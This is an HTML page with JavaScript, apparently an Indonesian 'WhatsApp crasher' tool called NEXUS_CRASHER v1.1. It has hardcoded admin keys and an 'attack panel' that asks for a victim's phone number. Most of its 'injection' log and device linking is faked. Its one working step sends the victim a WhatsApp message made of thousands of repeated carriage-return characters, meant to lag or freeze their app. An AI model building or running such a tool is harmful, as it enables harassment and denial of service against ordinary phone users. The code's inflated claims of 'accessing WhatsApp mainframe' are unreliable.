<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS_CRASHER v1.1 | hanzX</title>
    <style>
        :root {
            --bg: #0d0208;
            --panel: #1a0514;
            --neon: #ff2e63;
            --text: #ffffff;
            --sub-text: #8b8b8b;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            overflow-x: hidden;
        }

        /* LOGIN SCREEN */
        #login-screen {
            position: fixed;
            width: 100%;
            height: 100%;
            background: var(--bg);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .card {
            background: var(--panel);
            width: 85%;
            max-width: 400px;
            padding: 25px;
            border-radius: 12px;
            border: 1px solid var(--neon);
            box-shadow: 0 0 20px rgba(255, 46, 99, 0.4);
        }

        input, select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #250a1f;
            border: 1px solid var(--neon);
            border-radius: 6px;
            color: white;
            box-sizing: border-box;
            outline: none;
        }

        .btn-main {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff2e63, #a01a3d);
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 15px rgba(255, 46, 99, 0.6);
        }

        /* MAIN APP */
        .header { padding: 20px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; }
        .content { padding: 20px; padding-bottom: 100px; }
        .hidden { display: none !important; }

        /* NAV BOTTOM */
        .nav-bottom {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: var(--panel);
            display: flex;
            justify-content: space-around;
            padding: 15px 0;
            border-top: 1px solid var(--neon);
        }
        .nav-item { color: var(--sub-text); font-size: 0.7rem; text-align: center; cursor: pointer; }
        .nav-item.active { color: var(--neon); text-shadow: 0 0 8px var(--neon); font-weight: bold; }
    </style>
</head>
<body>

    <div id="login-screen">
        <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon); letter-spacing: 5px;">NEXUS_CRASHER</h1>
        <p style="color: var(--sub-text); margin-top: -10px;">VERSION 1.1</p>
        <div class="card">
            <label>Access Control:</label>
            <input type="password" id="access-key" placeholder="Enter Admin Key...">
            <button class="btn-main" onclick="handleLogin()">AUTHENTICATE</button>
            <p id="login-msg" style="color: red; font-size: 0.8rem; margin-top: 10px; text-align: center;"></p>
        </div>
    </div>

    <div id="app-content" class="hidden">
        <div class="header">
            <div style="font-weight: bold; color: var(--neon);">[ NEXUS_CRASHER v1.1 ]</div>
            <div style="font-size: 0.8rem;">Role: <span style="color: #00ff00;">Premium</span></div>
        </div>

        <div class="content">
            <div id="page-home">
                <div class="card" style="border-style: dashed;">
                    <h3 style="margin: 0;">User: rehan1270</h3>
                    <p style="color: var(--neon); font-size: 0.9rem;">License: PERMANENT (Nexus Elite)</p>
                </div>
                <br>
                <div class="card">
                    <p>Total Payload Sent: <span id="count" style="color: var(--neon); font-weight: bold;">0</span></p>
                    <button class="btn-main" onclick="showPage('whatsapp')">GOTO CONTROL PANEL</button>
                </div>
            </div>

            <div id="page-sender" class="hidden">
                <div class="card" style="text-align: center;">
                    <h3>DEVICE CONNECTION</h3>
                    <div id="qr-box" style="background: white; width: 180px; height: 180px; margin: 15px auto; padding: 10px;">
                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Nexus_Crasher_v1.1_Auth" alt="QR">
                    </div>
                    <p id="qr-status" style="font-size: 0.8rem; color: yellow;">Status: Waiting for Peer Link...</p>
                    <button class="btn-main" style="background: #25d366; box-shadow: 0 0 10px #25d366;" onclick="startConnect()">LINK DEVICE</button>
                </div>
            </div>

            <div id="page-whatsapp" class="hidden">
                <div class="card">
                    <h3 style="text-align: center;">ATTACK PANEL</h3>
                    <label>Victim Number (628x):</label>
                    <input type="number" id="target-num" placeholder="Ex: 62812345678">
                    
                    <label>Select Crash Payload:</label>
                    <select id="payload">
                        <option value="crash">NEXUS_FORCE_CLOSE (V1.1)</option>
                        <option value="delay">INVISIBLE_DELAY (LAG)</option>
                        <option value="blank">UI_SYSTEM_FREEZE</option>
                    </select>
                    <br><br>
                    <button id="attack-btn" class="btn-main" onclick="sendAttack()">EXECUTE ATTACK!</button>
                    <div id="attack-log" style="font-size: 0.7rem; color: #00ff00; margin-top: 15px; font-style: italic;"></div>
                </div>
            </div>
        </div>

        <nav class="nav-bottom">
            <div class="nav-item active" id="nav-home" onclick="showPage('home')">HOME</div>
            <div class="nav-item" id="nav-whatsapp" onclick="showPage('whatsapp')">ATTACK</div>
            <div class="nav-item" id="nav-sender" onclick="showPage('sender')">SENDER</div>
        </nav>
    </div>

    <script>
        function handleLogin() {
            const key = document.getElementById('access-key').value;
            if(key === "hanzX" || key === "admin") {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('app-content').classList.remove('hidden');
            } else {
                document.getElementById('login-msg').innerText = "Incorrect Key! (HanzX Access Only)";
            }
        }

        function showPage(page) {
            document.getElementById('page-home').classList.add('hidden');
            document.getElementById('page-whatsapp').classList.add('hidden');
            document.getElementById('page-sender').classList.add('hidden');
            document.getElementById('page-' + page).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            document.getElementById('nav-' + page).classList.add('active');
        }

        function startConnect() {
            const status = document.getElementById('qr-status');
            status.innerText = "Connecting to Nexus Server...";
            setTimeout(() => {
                status.style.color = "#00ff00";
                status.innerText = "Device Linked! Ready to Deploy.";
                alert("NEXUS_CRASHER v1.1 Linked Successfully!");
            }, 2000);
        }

        let totalSent = 0;
        function sendAttack() {
            const target = document.getElementById('target-num').value;
            const log = document.getElementById('attack-log');
            const btn = document.getElementById('attack-btn');

            if(!target) return alert("Victim number is required cok!");

            btn.innerText = "INJECTING...";
            log.innerHTML = "[*] Accessing WhatsApp Mainframe...<br>";
            
            setTimeout(() => {
                log.innerHTML += "[*] Deploying Nexus_Crasher v1.1 Payload...<br>";
                setTimeout(() => {
                    log.innerHTML += "[V] ATTACK SUCCESSFULLY DEPLOYED TO " + target;
                    btn.innerText = "EXECUTE ATTACK!";
                    totalSent++;
                    document.getElementById('count').innerText = totalSent;

                    // EKSEKUSI BUG KARAKTER
                    const bugText = encodeURIComponent("%0D".repeat(6000) + " [ NEXUS_CRASHER v1.1 BY hanzX ] ");
                    window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${bugText}`;
                }, 1500);
            }, 1000);
        }
    </script>
</body>
</html>
